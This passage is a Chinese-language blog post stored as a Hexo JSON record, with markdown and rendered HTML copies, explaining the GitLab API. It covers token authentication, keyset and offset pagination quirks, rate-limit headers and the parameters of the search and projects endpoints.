\"https://gitlab.example.com/api/v4/projects?pagination=keyset&per_page=50&order_by=id&sort=asc\"\n```\n\n响应信息（**官网文档案例**中响应中包含到下一页的链接）\n\n```\nHTTP/1.1 200 OK\n...\nLink: <https://gitlab.example.com/api/v4/projects?pagination=keyset&per_page=50&order_by=id&sort=asc&id_after=42>; rel=\"next\"\nStatus: 200 OK\n...\n```\n\n**按官网文档介绍**，下一页链接中包含额外的过滤器`id_after`，过滤器类型取决于`order_by`选项，当没有更多的记录时，响应头不包含`Link`字段。`rel=\"next\"`，并不是唯一的情况，还可能有`rel=\"first\"`、rel=\"last\"，`Link`字段中也可能同时存在多个`<....>; rel=\"...\"`，解码时需要注意。\n\n仅对特定的资源支持键集分页(实际上应该不止这个接口)\n\n\n| Resource                                                     | Order              |\n| ----------------------------------------------------------- | ----------------- |\n| [/api/v4/projects](https://docs.gitlab.com/ee/api/projects.html) | `order_by=id` only |\n\n\n**实际验证之后发现**，与文档描述是不一样的，响应头`Link`字段中的链接增加的参数不是`order_by`字段，而是`page=2`参数，以及增加了`/api/v4/projects`接口的其他参数，如下所示：\n\n```\nHTTP/1.1 200 OK\n...\nLink: <https://gitlab.com/api/v4/projects?membership=false&order_by=id&owned=false&page=2&pagination=keyset&per_page=50&repository_checksum_failed=false&simple=false&sort=asc&starred=false&statistics=false&wiki_checksum_failed=false&with_custom_attributes=false&with_issues_enabled=false&with_merge_requests_enabled=false>; rel=\"next\", <https://gitlab.com/api/v4/projects?membership=false&order_by=id&owned=false&page=1&pagination=keyset&per_page=50&repository_checksum_failed=false&simple=false&sort=asc&starred=false&statistics=false&wiki_checksum_failed=false&with_custom_attributes=false&with_issues_enabled=false&with_merge_requests_enabled=false>; rel=\"first\"\n...\n```\n\n可能是官网文档较长时间没更新了吧\n\n\n\n### 分页响应头\n\n分页响应头中包含下面字段\n\n\n| 响应头          | 描述                                                         |\n| -------------- | ----------------------------------------------------------- |\n| `X-Total`       | 结果总数量（并不一定返回，官网介绍出于性能原因考虑结果集大于1000时就不会返回，实际上不返回的情况可能更多） |\n| `X-Total-Pages` | 结果总页数（并不一定返回，官网介绍出于性能原因考虑结果集大于1000时就不会返回，实际上不返回的情况可能更多） |\n| `X-Per-Page`    | 每页多少条                                                   |\n| `X-Page`        | 当期所在页                                                   |\n| `X-Next-Page`   | 下一页                                                       |\n| `X-Prev-Page`   | 前一页                                                       |\n\n\n分页这里还是有不少坑的，实际表现与官方文档描述诸多不符\n\n键集分页响应头中另外还包含如下字段\n\n\n| 响应头 | 描述                                                         |\n| ----- | ----------------------------------------------------------- |\n| `Link` | 可能包含下一页的请求地址、上一页的请求地址、第一页的请求地址、最后一页的请求地址。仅仅是可能包含，不一定包含，比如，当结果总条数特别多时，就不会包含最后一页的请求地址（可能是性能原因考虑，gitlab服务器上实际上没有查询完所有结果就响应了）；当页面位于第一页时，不会包含上一页的请求地址。 |\n\n\n\n## 频率限制([官网文档地址](https://docs.gitlab.com/ee/security/rate_limits.html))\n\n实际上频率限制这一块文档，基本是面向2B客户（即在自己服务器上部署gitlab的客户）的，API查询从官网文档中得不到多少信息。`Rack Attach`章节，可能会有些许借鉴意义，它旨在限制来自大量请求的IP地址的请求。\n\n### Rack Attach\n\nAPI查询的请求头中返回的字段会包含如下几个([此处官网链接](https://docs.gitlab.com/ee/user/gitlab_com/index.html#haproxy-api-throttle))：\n\n```\nRateLimit-Limit: 600\nRateLimit-Observed: 6\nRateLimit-Remaining: 594\nRateLimit-Reset: 1563325137\nRateLimit-ResetTime: Wed, 17 Jul 2019 00:58:57 GMT\n```\n\n其中`RateLimit-Remaining`表示到重置时间`RateLimit-Reset`为止，能进行多少次请求\n\n对于某些受保护的接口，每分钟超过10次的情况下，会触发code `429`，并且响应头中会包含如下信息。表明当前IP被服务器限制请求，可在60秒后重新发起请求\n\n```\nRetry-After: 60\n```\n\n\n\n默认情况下，受保护的接口有\n\n```\ndefault['gitlab']['gitlab-rails']['rack_attack_protected_paths'] = [\n  '/users/password',\n  '/users/sign_in',\n  '/api/#{API::API.version}/session.json',\n  '/api/#{API::API.version}/session',\n  '/users',\n  '/users/confirmation',\n  '/unsubscribes/',\n  '/import/github/personal_access_token',\n  '/admin/session'\n]\n```\n\n\n\n### 设置项目的请求频率\n\n这一块与API请求无关，是2B客户设置请求频率相关的内容，可以在[User and IP rate limits](https://docs.gitlab.com/ee/user/admin_area/settings/user_and_ip_rate_limits.html)和[Rate limits on raw endpoints](https://docs.gitlab.com/ee/user/admin_area/settings/rate_limits_on_raw_endpoints.html)章节中查看\n\n\n\n## 查询相关接口[官网文档地址](https://docs.gitlab.com/ee/api/README.html#status-codes)\n\n### search接口\n\n全局（不限项目project/不限组织group）search接口路径\n\n```\n/api/v4/search\n```\n\n参数\n\n\n| 参数     | 描述         |\n| ------- | ----------- |\n| `scope`  | 搜索范围     |\n| `search` | 搜索的字符串 |\n\n\nscope取值\n\n\n| 取值 | 描述 |\n| ---- | ---- |\n| projects | 从项目名称和项目描述中搜索 |\n| merge_requests | 从merge记录搜索 |\n| issues | 从issue搜索 |\n| milestones | 从发布的里程碑版本搜索 |\n| snippet_titles | 从代码片（与项目没有关系，是另一种与项目同级别的产品）标题搜索 |\n| snippet_blobs | 从代码片的内容搜索 |\n| wiki_blobs | 从项目的文件内容搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用），在官网描述中看不出wiki_blobs与blobs有何区别 |\n| commits | 从commit中搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用） |\n| blobs | 从项目的文件内容搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用） |\n| users | 从用户名搜索 |\n\n\n### projects接口\n\n接口路径\n\n```\n/api/v4/projects\n```\n\n参数\n\n\n| 参数                          | 类型    | 是否必传 | 描述                                                         |\n| ---------------------------- | ------ | ------- | ----------------------------------------------------------- |\n| `archived`                    | boolean | no       | 过滤打包状态                                                 |\n| `visibility`                  | string  | no       | 过滤可见范围 `public`, `internal`, `private`                 |\n| `order_by`                    | string  | no       | 排序依据字段，可以为`id`, `name`, `path`, `created_at`, `updated_at`, `last_activity_at` 字段，默认是 `created_at` |\n| `sort`                        | string  | no       | 排序，`asc` / `desc` ，默认是 `desc`                         |\n| `search`                      | string  | no       | 搜索字符串                                                   |\n| `simple`                      | boolean | no       | true时，只返回少量简单字段                                   |\n| `owned`                       | boolean | no       | 过滤，仅当前用户拥有的项目                                   |\n| `membership`                  | boolean | no       | 过滤，仅当前用户所属的项目                                   |\n| `starred`                     | boolean | no       | 过滤，仅当前用户加星的项目                                   |\n| `statistics`                  | boolean | no       | 包括项目统计                                                 |\n| `with_custom_attributes`      | boolean | no       | 过滤，包含[自定义属性 custom_attributes](https://docs.gitlab.com/ee/api/custom_attributes.html)设置（仅管理员） |\n| `with_issues_enabled`         | boolean | no       | 过滤，根据issues_enabled值                                   |\n| `with_merge_requests_enabled` | boolean | no       | 过滤，根据merge_requests_enabled值                           |\n| `with_programming_language`   | string  | no       | 过滤，按编程语言过滤                                         |\n| `wiki_checksum_failed`        | boolean | no       | wiki校验值计算失败的项目([GitLab Premium](https://about.gitlab.com/pricing/) 11.2中的[介绍](https://gitlab.com/gitlab-org/gitlab/merge_requests/6137)) |\n| `repository_checksum_failed`  | boolean | no       | repository校验值计算失败的项目([GitLab Premium](https://about.gitlab.com/pricing/) 11.2中的[介绍](https://gitlab.com/gitlab-org/gitlab/merge_requests/6137)) |\n| `min_access_level`            | integer | no       | 过滤，仅当前用户的 [最低访问权限级别](https://docs.gitlab.com/ee/api/members.html) |\n| `id_after`                    | integer | no       | 过滤，限制为ID大于指定ID的项目                               |\n| `id_before`                   | integer | no       | 过滤，限制为ID小于指定ID的项目                               |\n\n\n返回值中有两个需要注意的参数`repository_access_level`和`visibility`，只有`repository_access_level`参数值为`enabled`且`visibility`参数值为`public`时才可以clone该仓库\n\n\n\n该接口，经身份验证的用户和未经身份验证的用户均可使用，但未经身份验证的用户响应内容中的信息会更少，与`simple=true`的时候相同。\n\n当请求中包含自定义属性时，请求url传参如下所示\n\n```\nGET /api/v4/projects?custom_attributes[key]=value&custom_attributes[other_key]=other_value\n```\n\n\n\n\n\n阅读文档后，没怎么弄懂上面`/api/v4/projects`和`/api/v4/search?scope=projects`这两个接口有什么重要的区别，姑且认为它们是可以相互取代的，使用任意一个皆可。\n\n\n","slug":"gitlab-api","published":1,"updated":"2020-02-14T14:18:38.933Z","_id":"ck5qhi075002pg0uks9hqbyjk","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"认证-官网文档地址\"><a href=\"#认证-官网文档地址\" class=\"headerlink\" title=\"认证(官网文档地址)\"></a>认证(<a href=\"https://docs.gitlab.com/ee/api/README.html#authentication\" target=\"_blank\" rel=\"noopener\">官网文档地址</a>)</h2><p>四种方式</p>\n<ol>\n<li>OAuth2 tokens</li>\n<li>Personal access tokens</li>\n<li>Session cookie</li>\n<li>GitLab CI job token (Specific endpoints only)</li>\n</ol>\n<h3 id=\"OAuth2-tokens\"><a href=\"#OAuth2-tokens\" class=\"headerlink\" title=\"OAuth2 tokens\"></a>OAuth2 tokens</h3><p><code>curl https://gitlab.example.com/api/v4/projects?access_token=OAUTH-TOKEN</code></p>\n<p>或</p>\n<p><code>curl --header &quot;Authorization: Bearer OAUTH-TOKEN&quot; https://gitlab.example.com/api/v4/projects</code></p>\n<h3 id=\"Personal-access-tokens\"><a href=\"#Personal-access-tokens\" class=\"headerlink\" title=\"Personal access tokens\"></a>Personal access tokens</h3><p><code>curl https://gitlab.example.com/api/v4/projects?private_token=&lt;your_access_token&gt;</code></p>\n<p>或</p>\n<p><code>curl --header &quot;Private-Token: &lt;your_access_token&gt;&quot; https://gitlab.example.com/api/v4/projects</code></p>\n<p>或</p>\n<p><code>curl --header &quot;Authorization: Bearer &lt;your_access_token&gt;&quot; https://gitlab.example.com/api/v4/projects</code></p>\n<h2 id=\"响应状态码-官网文档地址\"><a href=\"#响应状态码-官网文档地址\" class=\"headerlink\" title=\"响应状态码(官网文档地址)\"></a>响应状态码(<a href=\"https://docs.gitlab.com/ee/api/README.html#status-codes\" target=\"_blank\" rel=\"noopener\">官网文档地址</a>)</h2><p>成功的状态码主要会有三种，失败的情况有多种，具体官网文档查看</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">状态码</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>200</code></td>\n<td align=\"center\">对于<code>GET</code>,<code>PUT</code>或<code>DELETE</code>请求，成功时返回的响应头中的状态码，并且返回的响应体包含json数据</td>\n</tr>\n<tr>\n<td align=\"center\"><code>201</code></td>\n<td align=\"center\">对于<code>POST</code>请求，成功时返回的响应头中的状态码，并且返回的响应体包含json数据</td>\n</tr>\n<tr>\n<td align=\"center\"><code>204</code></td>\n<td align=\"center\">表示服务器成功执行了请求，但返回的响应体无内容（即无响应体部分）</td>\n</tr>\n</tbody></table>\n<h2 id=\"分页-官网文档地址\"><a href=\"#分页-官网文档地址\" class=\"headerlink\" title=\"分页(官网文档地址)\"></a>分页(<a href=\"https://docs.gitlab.com/ee/api/README.html#pagination\" target=\"_blank\" rel=\"noopener\">官网文档地址</a>)</h2><p>提供两种分页方式</p>\n<ol>\n<li>键集分页（性能原因考虑，官网推荐这种方式）</li>\n<li>偏移分页</li>\n</ol>\n<h3 id=\"偏移分页\"><a href=\"#偏移分页\" class=\"headerlink\" title=\"偏移分页\"></a>偏移分页</h3><p>请求参数控制分页</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数名</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>page</code></td>\n<td align=\"center\">页码（默认1）</td>\n</tr>\n<tr>\n<td align=\"center\"><code>per_page</code></td>\n<td align=\"center\">每页数量（默认20，最大100）</td>\n</tr>\n</tbody></table>\n<h3 id=\"键集分页\"><a href=\"#键集分页\" class=\"headerlink\" title=\"键集分页\"></a>键集分页</h3><p>键集分页可以更有效地检索页面，并且与基于偏移的分页不同，运行时与集合的大小无关（翻译自官网）。</p>\n<p>请求参数控制分页</p>\n<table>\n<thead>\n<tr>\n<th>参数名</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>pagination</code></td>\n<td><code>keyset</code> (为了允许键集分页而设定)</td>\n</tr>\n<tr>\n<td><code>per_page</code></td>\n<td>每页数量（默认20，最大100）</td>\n</tr>\n</tbody></table>\n<p>例（<strong>官网文档案例</strong>）：</p>\n<p>请求（官网文档上<code>--request PUT</code>应该是错的，实际请求应该去掉）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl --request PUT --header &quot;PRIVATE-TOKEN: &lt;your_access_token&gt;&quot; &quot;https://gitlab.example.com/api/v4/projects?pagination=keyset&amp;per_page=50&amp;order_by=id&amp;sort=asc&quot;</span><br></pre></td></tr></table></figure>\n\n<p>响应信息（<strong>官网文档案例</strong>中响应中包含到下一页的链接）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">...</span><br><span class=\"line\">Link: &lt;https://gitlab.example.com/api/v4/projects?pagination=keyset&amp;per_page=50&amp;order_by=id&amp;sort=asc&amp;id_after=42&gt;; rel=&quot;next&quot;</span><br><span class=\"line\">Status: 200 OK</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p><strong>按官网文档介绍</strong>，下一页链接中包含额外的过滤器<code>id_after</code>，过滤器类型取决于<code>order_by</code>选项，当没有更多的记录时，响应头不包含<code>Link</code>字段。<code>rel=&quot;next&quot;</code>，并不是唯一的情况，还可能有<code>rel=&quot;first&quot;</code>、rel=”last”，<code>Link</code>字段中也可能同时存在多个<code>&lt;....&gt;; rel=&quot;...&quot;</code>，解码时需要注意。</p>\n<p>仅对特定的资源支持键集分页(实际上应该不止这个接口)</p>\n<table>\n<thead>\n<tr>\n<th>Resource</th>\n<th>Order</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"https://docs.gitlab.com/ee/api/projects.html\" target=\"_blank\" rel=\"noopener\">/api/v4/projects</a></td>\n<td><code>order_by=id</code> only</td>\n</tr>\n</tbody></table>\n<p><strong>实际验证之后发现</strong>，与文档描述是不一样的，响应头<code>Link</code>字段中的链接增加的参数不是<code>order_by</code>字段，而是<code>page=2</code>参数，以及增加了<code>/api/v4/projects</code>接口的其他参数，如下所示：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">...</span><br><span class=\"line\">Link: &lt;https://gitlab.com/api/v4/projects?membership=false&amp;order_by=id&amp;owned=false&amp;page=2&amp;pagination=keyset&amp;per_page=50&amp;repository_checksum_failed=false&amp;simple=false&amp;sort=asc&amp;starred=false&amp;statistics=false&amp;wiki_checksum_failed=false&amp;with_custom_attributes=false&amp;with_issues_enabled=false&amp;with_merge_requests_enabled=false&gt;; rel=&quot;next&quot;, &lt;https://gitlab.com/api/v4/projects?membership=false&amp;order_by=id&amp;owned=false&amp;page=1&amp;pagination=keyset&amp;per_page=50&amp;repository_checksum_failed=false&amp;simple=false&amp;sort=asc&amp;starred=false&amp;statistics=false&amp;wiki_checksum_failed=false&amp;with_custom_attributes=false&amp;with_issues_enabled=false&amp;with_merge_requests_enabled=false&gt;; rel=&quot;first&quot;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>可能是官网文档较长时间没更新了吧</p>\n<h3 id=\"分页响应头\"><a href=\"#分页响应头\" class=\"headerlink\" title=\"分页响应头\"></a>分页响应头</h3><p>分页响应头中包含下面字段</p>\n<table>\n<thead>\n<tr>\n<th>响应头</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>X-Total</code></td>\n<td>结果总数量（并不一定返回，官网介绍出于性能原因考虑结果集大于1000时就不会返回，实际上不返回的情况可能更多）</td>\n</tr>\n<tr>\n<td><code>X-Total-Pages</code></td>\n<td>结果总页数（并不一定返回，官网介绍出于性能原因考虑结果集大于1000时就不会返回，实际上不返回的情况可能更多）</td>\n</tr>\n<tr>\n<td><code>X-Per-Page</code></td>\n<td>每页多少条</td>\n</tr>\n<tr>\n<td><code>X-Page</code></td>\n<td>当期所在页</td>\n</tr>\n<tr>\n<td><code>X-Next-Page</code></td>\n<td>下一页</td>\n</tr>\n<tr>\n<td><code>X-Prev-Page</code></td>\n<td>前一页</td>\n</tr>\n</tbody></table>\n<p>分页这里还是有不少坑的，实际表现与官方文档描述诸多不符</p>\n<p>键集分页响应头中另外还包含如下字段</p>\n<table>\n<thead>\n<tr>\n<th>响应头</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>Link</code></td>\n<td>可能包含下一页的请求地址、上一页的请求地址、第一页的请求地址、最后一页的请求地址。仅仅是可能包含，不一定包含，比如，当结果总条数特别多时，就不会包含最后一页的请求地址（可能是性能原因考虑，gitlab服务器上实际上没有查询完所有结果就响应了）；当页面位于第一页时，不会包含上一页的请求地址。</td>\n</tr>\n</tbody></table>\n<h2 id=\"频率限制-官网文档地址\"><a href=\"#频率限制-官网文档地址\" class=\"headerlink\" title=\"频率限制(官网文档地址)\"></a>频率限制(<a href=\"https://docs.gitlab.com/ee/security/rate_limits.html\" target=\"_blank\" rel=\"noopener\">官网文档地址</a>)</h2><p>实际上频率限制这一块文档，基本是面向2B客户（即在自己服务器上部署gitlab的客户）的，API查询从官网文档中得不到多少信息。<code>Rack Attach</code>章节，可能会有些许借鉴意义，它旨在限制来自大量请求的IP地址的请求。</p>\n<h3 id=\"Rack-Attach\"><a href=\"#Rack-Attach\" class=\"headerlink\" title=\"Rack Attach\"></a>Rack Attach</h3><p>API查询的请求头中返回的字段会包含如下几个(<a href=\"https://docs.gitlab.com/ee/user/gitlab_com/index.html#haproxy-api-throttle\" target=\"_blank\" rel=\"noopener\">此处官网链接</a>)：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RateLimit-Limit: 600</span><br><span class=\"line\">RateLimit-Observed: 6</span><br><span class=\"line\">RateLimit-Remaining: 594</span><br><span class=\"line\">RateLimit-Reset: 1563325137</span><br><span class=\"line\">RateLimit-ResetTime: Wed, 17 Jul 2019 00:58:57 GMT</span><br></pre></td></tr></table></figure>\n\n<p>其中<code>RateLimit-Remaining</code>表示到重置时间<code>RateLimit-Reset</code>为止，能进行多少次请求</p>\n<p>对于某些受保护的接口，每分钟超过10次的情况下，会触发code <code>429</code>，并且响应头中会包含如下信息。表明当前IP被服务器限制请求，可在60秒后重新发起请求</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Retry-After: 60</span><br></pre></td></tr></table></figure>\n\n<p>默认情况下，受保护的接口有</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">default[&apos;gitlab&apos;][&apos;gitlab-rails&apos;][&apos;rack_attack_protected_paths&apos;] = [</span><br><span class=\"line\">  &apos;/users/password&apos;,</span><br><span class=\"line\">  &apos;/users/sign_in&apos;,</span><br><span class=\"line\">  &apos;/api/#&#123;API::API.version&#125;/session.json&apos;,</span><br><span class=\"line\">  &apos;/api/#&#123;API::API.version&#125;/session&apos;,</span><br><span class=\"line\">  &apos;/users&apos;,</span><br><span class=\"line\">  &apos;/users/confirmation&apos;,</span><br><span class=\"line\">  &apos;/unsubscribes/&apos;,</span><br><span class=\"line\">  &apos;/import/github/personal_access_token&apos;,</span><br><span class=\"line\">  &apos;/admin/session&apos;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"设置项目的请求频率\"><a href=\"#设置项目的请求频率\" class=\"headerlink\" title=\"设置项目的请求频率\"></a>设置项目的请求频率</h3><p>这一块与API请求无关，是2B客户设置请求频率相关的内容，可以在<a href=\"https://docs.gitlab.com/ee/user/admin_area/settings/user_and_ip_rate_limits.html\" target=\"_blank\" rel=\"noopener\">User and IP rate limits</a>和<a href=\"https://docs.gitlab.com/ee/user/admin_area/settings/rate_limits_on_raw_endpoints.html\" target=\"_blank\" rel=\"noopener\">Rate limits on raw endpoints</a>章节中查看</p>\n<h2 id=\"查询相关接口官网文档地址\"><a href=\"#查询相关接口官网文档地址\" class=\"headerlink\" title=\"查询相关接口官网文档地址\"></a>查询相关接口<a href=\"https://docs.gitlab.com/ee/api/README.html#status-codes\" target=\"_blank\" rel=\"noopener\">官网文档地址</a></h2><h3 id=\"search接口\"><a href=\"#search接口\" class=\"headerlink\" title=\"search接口\"></a>search接口</h3><p>全局（不限项目project/不限组织group）search接口路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/api/v4/search</span><br></pre></td></tr></table></figure>\n\n<p>参数</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>scope</code></td>\n<td>搜索范围</td>\n</tr>\n<tr>\n<td><code>search</code></td>\n<td>搜索的字符串</td>\n</tr>\n</tbody></table>\n<p>scope取值</p>\n<table>\n<thead>\n<tr>\n<th>取值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>projects</td>\n<td>从项目名称和项目描述中搜索</td>\n</tr>\n<tr>\n<td>merge_requests</td>\n<td>从merge记录搜索</td>\n</tr>\n<tr>\n<td>issues</td>\n<td>从issue搜索</td>\n</tr>\n<tr>\n<td>milestones</td>\n<td>从发布的里程碑版本搜索</td>\n</tr>\n<tr>\n<td>snippet_titles</td>\n<td>从代码片（与项目没有关系，是另一种与项目同级别的产品）标题搜索</td>\n</tr>\n<tr>\n<td>snippet_blobs</td>\n<td>从代码片的内容搜索</td>\n</tr>\n<tr>\n<td>wiki_blobs</td>\n<td>从项目的文件内容搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用），在官网描述中看不出wiki_blobs与blobs有何区别</td>\n</tr>\n<tr>\n<td>commits</td>\n<td>从commit中搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用）</td>\n</tr>\n<tr>\n<td>blobs</td>\n<td>从项目的文件内容搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用）</td>\n</tr>\n<tr>\n<td>users</td>\n<td>从用户名搜索</td>\n</tr>\n</tbody></table>\n<h3 id=\"projects接口\"><a href=\"#projects接口\" class=\"headerlink\" title=\"projects接口\"></a>projects接口</h3><p>接口路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/api/v4/projects</span><br></pre></td></tr></table></figure>\n\n<p>参数</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>类型</th>\n<th>是否必传</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>archived</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤打包状态</td>\n</tr>\n<tr>\n<td><code>visibility</code></td>\n<td>string</td>\n<td>no</td>\n<td>过滤可见范围 <code>public</code>, <code>internal</code>, <code>private</code></td>\n</tr>\n<tr>\n<td><code>order_by</code></td>\n<td>string</td>\n<td>no</td>\n<td>排序依据字段，可以为<code>id</code>, <code>name</code>, <code>path</code>, <code>created_at</code>, <code>updated_at</code>, <code>last_activity_at</code> 字段，默认是 <code>created_at</code></td>\n</tr>\n<tr>\n<td><code>sort</code></td>\n<td>string</td>\n<td>no</td>\n<td>排序，<code>asc</code> / <code>desc</code> ，默认是 <code>desc</code></td>\n</tr>\n<tr>\n<td><code>search</code></td>\n<td>string</td>\n<td>no</td>\n<td>搜索字符串</td>\n</tr>\n<tr>\n<td><code>simple</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>true时，只返回少量简单字段</td>\n</tr>\n<tr>\n<td><code>owned</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤，仅当前用户拥有的项目</td>\n</tr>\n<tr>\n<td><code>membership</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤，仅当前用户所属的项目</td>\n</tr>\n<tr>\n<td><code>starred</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤，仅当前用户加星的项目</td>\n</tr>\n<tr>\n<td><code>statistics</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>包括项目统计</td>\n</tr>\n<tr>\n<td><code>with_custom_attributes</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤，包含<a href=\"https://docs.gitlab.com/ee/api/custom_attributes.html\" target=\"_blank\" rel=\"noopener\">自定义属性 custom_attributes</a>设置（仅管理员）</td>\n</tr>\n<tr>\n<td><code>with_issues_enabled</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤，根据issues_enabled值</td>\n</tr>\n<tr>\n<td><code>with_merge_requests_enabled</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤，根据merge_requests_enabled值</td>\n</tr>\n<tr>\n<td><code>with_programming_language</code></td>\n<td>string</td>\n<td>no</td>\n<td>过滤，按编程语言过滤</td>\n</tr>\n<tr>\n<td><code>wiki_checksum_failed</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>wiki校验值计算失败的项目(<a href=\"https://about.gitlab.com/pricing/\" target=\"_blank\" rel=\"noopener\">GitLab Premium</a> 11.2中的<a href=\"https://gitlab.com/gitlab-org/gitlab/merge_requests/6137\" target=\"_blank\" rel=\"noopener\">介绍</a>)</td>\n</tr>\n<tr>\n<td><code>repository_checksum_failed</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>repository校验值计算失败的项目(<a href=\"https://about.gitlab.com/pricing/\" target=\"_blank\" rel=\"noopener\">GitLab Premium</a> 11.2中的<a href=\"https://gitlab.com/gitlab-org/gitlab/merge_requests/6137\" target=\"_blank\" rel=\"noopener\">介绍</a>)</td>\n</tr>\n<tr>\n<td><code>min_access_level</code></td>\n<td>integer</td>\n<td>no</td>\n<td>过滤，仅当前用户的 <a href=\"https://docs.gitlab.com/ee/api/members.html\" target=\"_blank\" rel=\"noopener\">最低访问权限级别</a></td>\n</tr>\n<tr>\n<td><code>id_after</code></td>\n<td>integer</td>\n<td>no</td>\n<td>过滤，限制为ID大于指定ID的项目</td>\n</tr>\n<tr>\n<td><code>id_before</code></td>\n<td>integer</td>\n<td>no</td>\n<td>过滤，限制为ID小于指定ID的项目</td>\n</tr>\n</tbody></table>\n<p>返回值中有两个需要注意的参数<code>repository_access_level</code>和<code>visibility</code>，只有<code>repository_access_level</code>参数值为<code>enabled</code>且<code>visibility</code>参数值为<code>public</code>时才可以clone该仓库</p>\n<p>该接口，经身份验证的用户和未经身份验证的用户均可使用，但未经身份验证的用户响应内容中的信息会更少，与<code>simple=true</code>的时候相同。</p>\n<p>当请求中包含自定义属性时，请求url传参如下所示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /api/v4/projects?custom_attributes[key]=value&amp;custom_attributes[other_key]=other_value</span><br></pre></td></tr></table></figure>\n\n<p>阅读文档后，没怎么弄懂上面<code>/api/v4/projects</code>和<code>/api/v4/search?scope=projects</code>这两个接口有什么重要的区别，姑且认为它们是可以相互取代的，使用任意一个皆可。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"认证-官网文档地址\"><a href=\"#认证-官网文档地址\" class=\"headerlink\" title=\"认证(官网文档地址)\"></a>认证(<a href=\"https://docs.gitlab.com/ee/api/README.html#authentication\" target=\"_blank\" rel=\"noopener\">官网文档地址</a>)</h2><p>四种方式</p>\n<ol>\n<li>OAuth2 tokens</li>\n<li>Personal access tokens</li>\n<li>Session cookie</li>\n<li>GitLab CI job token (Specific endpoints only)</li>\n</ol>\n<h3 id=\"OAuth2-tokens\"><a href=\"#OAuth2-tokens\" class=\"headerlink\" title=\"OAuth2 tokens\"></a>OAuth2 tokens</h3><p><code>curl https://gitlab.example.com/api/v4/projects?access_token=OAUTH-TOKEN</code></p>\n<p>或</p>\n<p><code>curl --header &quot;Authorization: Bearer OAUTH-TOKEN&quot; https://gitlab.example.com/api/v4/projects</code></p>\n<h3 id=\"Personal-access-tokens\"><a href=\"#Personal-access-tokens\" class=\"headerlink\" title=\"Personal access tokens\"></a>Personal access tokens</h3><p><code>curl 